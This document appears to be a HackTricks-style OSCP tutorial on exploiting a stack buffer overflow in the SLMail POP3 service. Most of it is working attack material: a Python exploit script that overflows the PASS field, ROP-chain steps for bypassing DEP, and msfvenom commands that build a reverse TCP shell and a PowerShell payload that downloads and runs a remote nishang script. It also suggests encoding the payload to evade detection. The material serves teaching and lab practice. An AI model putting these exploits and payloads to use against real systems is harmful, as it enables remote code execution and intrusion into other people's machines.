# Windows Exploiting (Basic Guide - OSCP lvl)

{{#include ../banners/hacktricks-training.md}}

## **Start installing the SLMail service**

## Restart SLMail service

Every time you need to **restart the service SLMail** you can do it using the windows console:

```
net start slmail
```

![](<../images/image (988).png>)

## Very basic python exploit template

```python
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

buffer = 'A' * 2700
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+port
```

## **Change Immunity Debugger Font**

Go to `Options >> Appearance >> Fonts >> Change(Consolas, Blod, 9) >> OK`

## **Attach the proces to Immunity Debugger:**

**File --> Attach**

![](<../images/image (869).png>)

**And press START button**

## **Send the exploit and check if EIP is affected:**

![](<../images/image (906).png>)

Every time you break the service you should restart it as is indicated in the beginnig of this page.

## Create a pattern to modify the EIP

The pattern should be as big as the buffer you used to broke the service previously.

![](<../images/image (420).png>)

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
```

Change the buffer of the exploit and set the pattern and lauch the exploit.

A new crash should appeard, but with a different EIP address:

![](<../images/image (636).png>)

Check if the address was in your pattern:

![](<../images/image (418).png>)

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 39694438
```

Looks like **we can modify the EIP in offset 2606** of the buffer.

Check it modifing the buffer of the exploit:

```
buffer = 'A'*2606 + 'BBBB' + 'CCCC'
```

With this buffer the EIP crashed should point to 42424242 ("BBBB")

![](<../images/image (874).png>)

![](<../images/image (92).png>)

Looks like it is working.

## Check for Shellcode space inside the stack

600B should be enough for any powerfull shellcode.

Lets change the bufer:

```
buffer = 'A'*2606 + 'BBBB' + 'C'*600
```

launch the new exploit and check the EBP and the length of the usefull shellcode

![](<../images/image (119).png>)

![](<../images/image (879).png>)

You can see that when the vulnerability is reached, the EBP is pointing to the shellcode and that we have a lot of space to locate a shellcode here.

In this case we have **from 0x0209A128 to 0x0209A2D6 = 430B.** Enough.

## Check for bad chars

Change again the buffer:

```
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer = 'A'*2606 + 'BBBB' + badchars
```

The badchars starts in 0x01 because 0x00 is almost always bad.

Execute repeatedly the exploit with this new buffer delenting the chars that are found to be useless:.

For example:

In this case you can see that **you shouldn't use the char 0x0A** (nothing is saved in memory since the char 0x09).

![](<../images/image (111).png>)

In this case you can see that **the char 0x0D is avoided**:

![](<../images/image (1098).png>)

## Find a JMP ESP as a return address

Using:

```
!mona modules    #Get protections, look for all false except last one (Dll of SO)
```

You will **list the memory maps**. Search for some DLl that has:

- **Rebase: False**
- **SafeSEH: False**
- **ASLR: False**
- **NXCompat: False**
- **OS Dll: True**

![](<../images/image (555).png>)

Now, inside this memory you should find some JMP ESP bytes, to do that execute:

```
!mona find -s "\xff\xe4" -m name_unsecure.dll # Search for opcodes insie dll space (JMP ESP)
!mona find -s "\xff\xe4" -m slmfc.dll # Example in this case
```

**Then, if some address is found, choose one that don't contain any badchar:**

![](<../images/image (605).png>)

**In this case, for example: _0x5f4a358f_**

---

## (Optional) Bypassing DEP & ASLR with a ROP chain (Windows 7 → 10)

Classic SLMail exploitation assumes that **DEP/NX is disabled** or that the target module was linked without `NXCompat`. On real-world targets (even older Windows 7 SP1) **DEP is usually enabled** and the stack is non-executable.  If you can control EIP but DEP blocks your shellcode you will need a **Return Oriented Programming (ROP)** chain that marks the stack as executable (or allocates RWX memory) before jumping to your payload.

### 1. Confirm the protection status

```
!mona modules              # look for modules where NXCompat = False  and ASLR = False
!mona noaslr               # list only the non-ASLR modules
```

If *all* loaded modules have `NXCompat: True` you cannot directly return to shellcode – you must build a ROP chain that calls a Windows API such as `VirtualProtect()` or `VirtualAlloc()`.

### 2. Auto-generate a VirtualProtect() chain with **mona**

```
# -cpb : bad chars, -m : limit search to non-ASLR/NX modules to keep the chain reliable
!mona rop -cpb "\x00\x0a\x0d" -n -m slmfc.dll
```

mona will create several files inside `C:\mona\%PID%\` — the interesting one is **`rop_chains.txt`** which already contains a ready-made chain that :

* Finds the address of `VirtualProtect()` and stores it in ESI
* Places a writable location in ECX (`lpOldProtect`)
* Sets EDX = `0x40` (`PAGE_EXECUTE_READWRITE`)
* Sets EBX = size of region (commonly `0x201` or bigger)
* Points EBP to a `JMP ESP` so execution continues on the stack after the API returns
* Finishes with a `PUSHAD ; RET` gadget that pivots into our shellcode

> **Tip:** you can tweak the chain automatically by editing the generated Python snippet in `rop_chains.txt`.

The technique is explained in depth in the memN0ps “Windows User Mode Exploit Development – DEP” series .

### 3. Integrate the chain in the exploit

```python
offset     = 2606                  # discovered with pattern_offset
jmp_esp    = "\x8f\x35\x4a\x5f"  # little-endian address found before
rop_chain  = (
    # Paste the mona generated chain here (typically ~180 bytes)
)

payload  = b"A"*offset + jmp_esp + rop_chain + b"\x90"*16 + shellcode
```

### 4. Bypass **ASLR** when only some modules are randomised

ASLR is applied **per module**.  Any third-party DLL that was **compiled without `/DYNAMICBASE`** will always be loaded at the same base address and can therefore be used to harvest gadgets for both the ROP chain **and** the final `JMP ESP`.  The `!mona modules` output already highlights those (`ASLR: False`).

When every module has ASLR enabled you will need a different strategy (e.g. an information leak) which is out of scope for this OSCP-level note.

### 5. Modern debuggers

* **Immunity Debugger** (required for mona.py) has not been updated since 2019 and may crash on Windows 10/11.  The usual workaround is to run it inside an **x86 Windows 7 VM**.
* For 64-bit targets you can switch to **WinDbg** or **x64dbg**.  mona does **not** work there, but you can still locate gadgets with tools such as **rp++**, **ROPGadget**, or **ropper**, then build the chain manually.

---

## Create shellcode

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f c -b '\x00\x0a\x0d'
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://10.11.0.41/nishang.ps1')\"" -f python -b '\x00\x0a\x0d'
```

If the exploit is not working but it should (you can see with ImDebg that the shellcode is reached), try to create other shellcodes (msfvenom with create different shellcodes for the same parameters).

**Add some NOPS at the beginning** of the shellcode and use it and the return address to JMP ESP, and finish the exploit:

```bash
#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

# Example: put your mona generated ROP chain here if DEP is enabled
rop_chain = ""  # <-- cut for brevity

shellcode = ("<same as before>")

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + rop_chain + "\x90" * 16 + shellcode
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+str(port)
```

> [!WARNING]
> There are shellcodes that will **overwrite themselves**, therefore it's important to always add some NOPs before the shellcode

## Improving the shellcode

Add this parameters:

```bash
EXITFUNC=thread -e x86/shikata_ga_nai
```

## References

- [memN0ps – Windows User Mode Exploit Development: DEP (Part 4)](https://memn0ps.github.io/windows-user-mode-exploit-development-dep-part-4/)
- [Corelan – mona.py manual (ROP generator & DEP/ASLR bypass)](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)

{{#include ../banners/hacktricks-training.md}}
